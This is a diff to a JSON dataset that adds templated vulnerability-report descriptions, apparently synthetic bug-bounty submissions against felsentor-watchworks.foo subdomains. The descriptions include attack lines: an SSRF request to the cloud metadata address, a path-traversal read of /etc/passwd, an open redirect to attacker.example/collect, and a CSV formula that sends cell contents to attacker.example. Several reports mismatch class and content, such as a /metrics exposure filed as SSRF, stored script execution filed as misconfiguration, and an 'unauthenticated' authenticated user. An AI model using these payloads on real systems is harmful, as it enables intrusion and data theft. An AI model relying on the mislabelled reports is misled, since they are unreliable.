+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6068,7 +6115,8 @@
           "offset": "3d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6172,7 +6220,8 @@
           "offset": "2d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6331,7 +6380,8 @@
           "offset": "3d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6467,7 +6517,8 @@
           "offset": "4d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6606,7 +6657,8 @@
           "offset": "8d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6733,7 +6785,8 @@
           "offset": "2d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6861,7 +6914,8 @@
           "offset": "1d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6996,7 +7050,8 @@
           "offset": "2d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7123,7 +7178,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7278,7 +7334,8 @@
           "offset": "7d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7381,7 +7438,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7474,7 +7532,8 @@
           "offset": "1d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7598,7 +7657,8 @@
           "offset": "20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7782,7 +7842,8 @@
           "offset": "7d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7903,7 +7964,8 @@
           "offset": "4d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8063,7 +8125,8 @@
           "offset": "4d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8238,7 +8301,8 @@
           "offset": "5d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8376,7 +8440,8 @@
           "offset": "4d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8495,7 +8560,8 @@
           "offset": "5d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8623,7 +8689,8 @@
           "offset": "2d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8774,7 +8841,8 @@
           "offset": "6d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8890,7 +8958,8 @@
           "offset": "5d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9010,7 +9079,8 @@
           "offset": "19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9128,7 +9198,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9254,7 +9325,8 @@
           "offset": "2d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9356,7 +9428,8 @@
           "offset": "16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dealers.felsentor-watchworks.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9519,7 +9592,8 @@
           "offset": "2d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9630,7 +9704,8 @@
           "offset": "1d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9766,7 +9841,8 @@
           "offset": "2d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9926,7 +10002,8 @@
           "offset": "7d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://dealers.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10038,7 +10115,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
